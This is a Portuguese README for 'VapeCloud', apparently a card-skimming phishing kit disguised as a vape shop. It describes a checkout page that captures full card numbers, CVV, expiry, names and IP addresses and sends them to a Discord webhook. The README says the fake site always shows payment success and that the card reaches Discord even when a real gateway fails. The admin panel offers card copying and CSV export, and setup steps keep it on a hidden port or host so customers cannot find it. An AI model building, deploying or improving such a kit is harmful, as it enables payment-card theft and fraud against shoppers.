# VapeCloud — backend + checkout + painel

Backend Node/Express que serve a sua index, a página de **checkout** (cartão + PIX) e o **painel admin**.
Captura os dados do cliente e dispara no seu **webhook do Discord**, com camada de gateway plugável.

## O que tem
- `public/index.html` — sua index original com o carrinho conectado ao checkout
- `public/checkout.html` — página de pagamento (cartão e PIX) com validação Luhn, marca, formatação
- `public/admin.html` (rota `/admin`) — painel protegido por senha
- `server.js` — toda a API + gateways
- `data/store.json` — onde ficam gravadas as capturas (faça backup!)

## Rodar local
```bash
npm install
cp .env.example .env   # edite ADMIN_PASSWORD e DISCORD_WEBHOOK
npm start
```
Abra http://localhost:3000 — site, /checkout.html e /admin.

## Deploy (Render / Railway / VPS)
- **Runtime:** Node ≥ 18.
- **Build:** `npm install`. **Start:** `npm start`.
- Defina nas env vars: `ADMIN_PASSWORD` (troque a senha!) e `DISCORD_WEBHOOK`.
- Em VPS, use um reverse proxy (Caddy/Nginx) com HTTPS — cartão vai trafegar em texto, então **HTTPS é obrigatório** na prática.
- As capturas ficam em `data/store.json`. Faça backup periódico do arquivo.

## Fluxo
1. Cliente adiciona ao carrinho → /checkout.html
2. Preenche dados → escolhe Cartão ou PIX → POST `/api/checkout`
3. Servidor valida (Luhn, validade, CVV), grava a captura, dispara o embed no Discord
4. Se uma gateway estiver configurada, tenta autorizar o cartão e devolve o status
5. Painel `/admin` lista tudo ao vivo, com busca, copiar cartão, exportar CSV

## Webhook do Discord
No painel, cole a URL do webhook (Discord > Integrações > Webhooks). Clique em "Testar webhook".
O embed chega com: cartão completo/mascarado, marca, validade, CVV, nome, pedido, total, IP, UA e status da gateway.
- **Mostrar número completo**: ligada por padrão. Desligue para chegar mascarado (•••• 1234).

## Gateways
- **Manual** (padrão): só captura + webhook. Site falso mostra sucesso sempre.
- **Stripe / Mercado Pago / Pagar.me**: preencha as chaves no painel. A autorização roda server-side e é não-fatal —
  mesmo se a gateway falhar, o cartão já caiu no Discord. Ative **"Só mostrar sucesso se a gateway aprovar"** se quiser cobrar de verdade.
- Modo de teste da gateway fica no painel (recomendado desenvolver em teste).
- Os ajustes exatos dos endpoints podem variar por conta/integração — se o seu plano for diferente, mexa nas funções
  `gwStripe`, `gwMP`, `gwPagarme` em `server.js`.

## PIX
A aba PIX gera um QR + copia-e-cola no formato EMV (demonstrativo) e envia para o webhook.
Para cobrança real via gateway, gere o código Pix no endpoint do seu processador dentro de `server.js` e devolva em `out.pix`.

## Segurança / observações
- Troque a `ADMIN_PASSWORD` antes de subir.
- O admin é autenticado por cookie HttpOnly (senha do ambiente).
- Cartão trafega via HTTPS e fica em disco em `data/store.json` — trate como dado sensível.
- A idade mínima (+18) continua sendo verificada no front (age gate).

## Banco de dados
Por padrão usa **SQLite** (`better-sqlite3`), arquivo único `data/vapecloud.db` (WAL). Sem o driver, cai em JSON em `data/`. Forçar: `DB=sqlite` | `DB=json`. Backup: **Ferramentas → Baixar backup** no painel, ou copie `data/vapecloud.db` (com `data/.key`).

## Painel em domínio separado (opcional)
Ligue `ADMIN_HOSTS` (+ IP + HTTPS): `ADMIN_HOSTS=admin.seudominio.com.br` · `ADMIN_IPS=...` · `SECURE=1`. Com isso `/admin` responde **404** fora do domínio autorizado. Caddy split por Host:
```
seudominio.com.br, www.seudominio.com.br { reverse_proxy 127.0.0.1:3000 }
admin.seudominio.com.br { reverse_proxy 127.0.0.1:3000
  @bloq not remote_ip 1.2.3.4 5.6.7.8
  handle @bloq { respond 403 } }
```

## Variáveis (.env)
`PORT` · `ADMIN_USERNAME/NAME/PASSWORD` · `DISCORD_WEBHOOK` · `ADMIN_PATH` · `ADMIN_IPS` · `ADMIN_HOSTS` · `SECURE=1` · `DATA_KEY` · `DB=auto|sqlite|json` · `SESSION_HOURS` · `CHECKOUT_PER_MIN`

## Rodar / testar
```
npm install
npm start        # http://localhost:3000 · painel /admin (admin / vapecloud)
npm run smoke    # sobe num port efêmero e roda testes (PASS/FAIL)
```


## Painel em URL/porta separada (sem o cliente achar /admin)
O painel roda numa **porta dedicada** — na loja `/admin` vira **404** e o painel só existe na outra URL.
- **Local:** com `ADMIN_PORT=3001` no `.env`, o `npm start` sobe a **loja em `http://localhost:3000`** e o **painel em `http://localhost:3001`**.
- **Produção:** aponte um subdomínio só pra porta do painel (Caddy, TLS automático):
    ```
    seudominio.com.br        { reverse_proxy localhost:3000 }
    painel.seudominio.com.br { reverse_proxy localhost:3001 }
    ```
- **Travar por IP:** `ADMIN_IPS=1.2.3.4,10.0.0.0/8` — quem não estiver na lista nem vê a tela de login.
- **Modo antigo:** deixe `ADMIN_PORT` vazio e o painel volta pra `/admin` da mesma porta.

## Banco de dados (SQLite)
- Usa **SQLite** (`data/vapecloud.db`) quando a lib `better-sqlite3` está instalada; senão cai num **arquivo JSON** (funciona igual pro nosso uso). Dados cifrados em repouso (AES-256-GCM) + backup diário.
- **Pra rodar o SQLite no Windows:** instale o **Node LTS 20 (ou 22)** — tem binário pronto do `better-sqlite3`, o `npm install` não compila nada — e rode `npm install` sem flag. Ou fique no Node atual e instale as *Build Tools for Visual Studio* (workload “Desktop development with C++”).

## Contas de clientes
- Página **`/conta.html`**: criar conta / entrar, editar dados e ver histórico de pedidos (com link de rastreio).
- No **checkout**, quem já entrou tem nome/CPF/e-mail/telefone/endereço **pré-preenchidos**.
- Senhas com hash scrypt, cookie HttpOnly, rate-limit por IP e bloqueio de menor de idade.
